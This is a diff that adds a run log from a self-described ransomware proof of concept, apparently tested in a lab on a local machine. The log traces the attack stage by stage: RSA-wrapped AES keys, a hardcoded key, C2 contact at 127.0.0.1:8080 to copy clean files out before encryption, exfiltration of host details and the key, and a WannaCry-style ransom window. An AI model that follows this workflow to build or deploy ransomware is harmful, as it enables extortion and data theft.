@@ -1,0 +1,44 @@
+2025-06-25 12:36:47,410 - INFO - ============================================================
+2025-06-25 12:36:47,411 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
+2025-06-25 12:36:47,411 - INFO - ============================================================
+2025-06-25 12:36:47,412 - INFO - Log file: logs/ransomware_activity_20250625_123647.log
+2025-06-25 12:36:47,412 - INFO - Timestamp: 2025-06-25 12:36:47
+2025-06-25 12:36:47,545 - INFO - Platform: Windows 11
+2025-06-25 12:36:47,546 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
+2025-06-25 12:36:47,546 - INFO - User: mudit
+2025-06-25 12:36:47,546 - INFO - Hostname: Mudityadev
+2025-06-25 12:36:47,547 - INFO - ============================================================
+2025-06-25 12:36:47,547 - INFO - Starting main function
+2025-06-25 12:36:47,547 - INFO - Parsing command line arguments
+2025-06-25 12:36:47,548 - INFO - Setting up argument parser
+2025-06-25 12:36:47,549 - INFO - Parsing command line arguments
+2025-06-25 12:36:47,550 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
+2025-06-25 12:36:47,550 - INFO - Operation mode: ENCRYPT
+2025-06-25 12:36:47,551 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
+2025-06-25 12:36:47,551 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
+2025-06-25 12:36:47,552 - INFO - Initializing RSA encryption for AES key
+2025-06-25 12:36:47,614 - INFO - AES key encrypted with RSA public key
+2025-06-25 12:36:47,615 - INFO - Encrypted key (base64): a1l6w8ncBzNQxiBh3pgoSS0CQbPts8dUChIeoqJwR0730iQjW5VjeiIA5PPI/i185ZnsMMhugt0djEYJpciqFaQtYKT8boAntHgVkn+Vh2hWK3GZ9EcxDHg7S8gl7szxnHcBlKYVyB09g1wHb3cl8b8PG8Ixqxb2iTz3MU2VMQ44GqwyhYFZ1V9JMpRbrmJRf7Xc9ycABci2XSYg70XOPhylkBjKUWDU1tJrL8rmfqDawotO3ByvMYaKgqhSqftoHe0aQejQQQ0NSt0AfxmRyUAkP5t2ryIfxGJmglD+p9Bw64waX3lQZrTyzRPDqZ+kSUXG3JXAQyffBDgKnp1M3w==
+2025-06-25 12:36:47,615 - INFO - Using hardcoded AES key for encryption
+2025-06-25 12:36:47,615 - INFO - Creating AES cipher with CTR mode
+2025-06-25 12:36:47,624 - INFO - Starting file discovery and processing
+2025-06-25 12:36:47,624 - INFO - Connecting to C2 server BEFORE encryption to copy clean files
+2025-06-25 12:36:47,624 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
+2025-06-25 12:36:47,644 - INFO - Retrieving local IP address
+2025-06-25 12:36:47,645 - INFO - Local IP address: 192.168.217.136
+2025-06-25 12:36:47,646 - INFO - Successfully sent target directory to C2 server: 127.0.0.1:8080
+2025-06-25 12:36:47,647 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
+2025-06-25 12:36:47,647 - INFO - C2 server will now copy clean files before encryption begins
+2025-06-25 12:36:47,647 - INFO - Waiting for C2 server to complete file exfiltration...
+2025-06-25 12:36:49,648 - INFO - Proceeding with file encryption...
+2025-06-25 12:36:49,648 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
+2025-06-25 12:36:49,649 - INFO - Discovered 0 files in D:\AI-Agent\Ransomware-PoC\testDir
+2025-06-25 12:36:49,650 - INFO - Total files processed: 0
+2025-06-25 12:36:49,650 - INFO - Starting key exfiltration and GUI launch
+2025-06-25 12:36:49,651 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
+2025-06-25 12:36:49,667 - INFO - Retrieving local IP address
+2025-06-25 12:36:49,668 - INFO - Local IP address: 192.168.217.136
+2025-06-25 12:36:49,669 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
+2025-06-25 12:36:49,669 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
+2025-06-25 12:36:49,670 - INFO - Launching WannaCry-style GUI window
+2025-06-25 12:36:55,847 - INFO - Received keyboard interrupt, exiting
